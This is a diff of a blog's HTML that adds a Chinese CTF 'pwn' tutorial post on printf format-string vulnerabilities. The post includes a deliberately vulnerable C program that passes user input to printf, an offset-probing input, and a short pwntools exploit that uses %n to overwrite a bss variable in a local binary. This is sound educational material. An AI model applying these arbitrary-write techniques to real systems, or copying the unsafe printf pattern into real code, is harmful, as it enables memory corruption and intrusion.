@@ -204,7 +204,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -217,7 +217,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -249,6 +249,115 @@
       
 
       
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/7fabda03/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ykx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lsh">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/7fabda03/" class="post-title-link" itemprop="url">格式化字符串</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2020-11-13 22:33:27 / 修改时间：23:38:53" itemprop="dateCreated datePublished" datetime="2020-11-13T22:33:27+08:00">2020-11-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在printf函数中，format字符串中有的参数，如果没有给出会自动访问在format之后的内存作为参数。</p>
+<h3 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">100</span>] = <span class="string">&quot;world&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello%s\n&quot;</span>,s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;new format:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入调试，首先可以看到正常的printf函数调用：</p>
+<p><img src="/posts/7fabda03/image-20201113225150355.png" alt="image-20201113225150355"></p>
+<p>可以看到，对于format，实际上在是存在栈上其偏移6的父函数栈帧上的即格式化字符串的偏移为6。与正常的函数调用时的参数关系一致。</p>
+<p><img src="/posts/7fabda03/IMG_0044.PNG" alt="IMG_0044"></p>
+<p>如果是缺少相应的参数，printf函数会从偏移1开始匹配参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa.%x.%x.%x.%x.%x.%x.%x.%x</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/7fabda03/image-20201113230619688.png" alt="image-20201113230619688"></p>
+<p><img src="/posts/7fabda03/image-20201113230645900.png" alt="image-20201113230645900"></p>
+<p><strong>这样的方法可以用来寻找格式化字符串的偏移量</strong></p>
+<p><strong>上述实验是32位，和64位中区别在于，64位优先将参数传入6个寄存器中。</strong></p>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>灵活使用格式化字符串的格式字符，可以做到任意地址的读写。</p>
+<p>常用到的有：</p>
+<ul>
+<li>%x 将参数作为无符号以十六进制表示的整数打印</li>
+<li>%p 打印地址</li>
+<li>%s 将参数作为字符串地址，打印相应字符串（如果参数指向的不是一个字符串会造成程序崩溃）</li>
+<li>%n 将参数作为地址，修改相应地址的内容。用于任意地址的写。</li>
+</ul>
+<p><strong>pwntools中有fmtstr_payload可以方便的构造任意地址写的payload</strong></p>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>在对任意地址写的时候，如果地址较低，\x00会造成格式化字符串的截断，无法达到预期效果。</p>
+<h4 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h4><p><img src="/posts/7fabda03/image-20201113232149244.png" alt="image-20201113232149244"></p>
+<p><img src="/posts/7fabda03/image-20201113232249593.png" alt="image-20201113232249593"></p>
+<p><img src="/posts/7fabda03/image-20201113232302791.png" alt="image-20201113232302791"></p>
+<p>显然存在格式化字符串漏洞，只需要将bss段的变量改为非0，执行后门函数即可。</p>
+<p>通过上述方法可以得到偏移为10.</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&quot;./pwn(2)&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">addr = <span class="number">0x60107c</span></span><br><span class="line">payload = <span class="string">b&#x27;aaa&#x27;</span>+<span class="string">b&quot;%11$n&quot;</span>+p64(addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里将要修改的地址置后，是p64(addr)的\x00会造成截断，如果payload为<code> p64(addr)+b&#39;%10$n&#39;</code></p>
+<p>格式化字符串不会读到‘%10$n’</p>
+<p>因此将地址之后，填满64位的内存，将地址的偏移构造为11.将0x60107c的内容改为3，执行sh函数。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
     
 
 
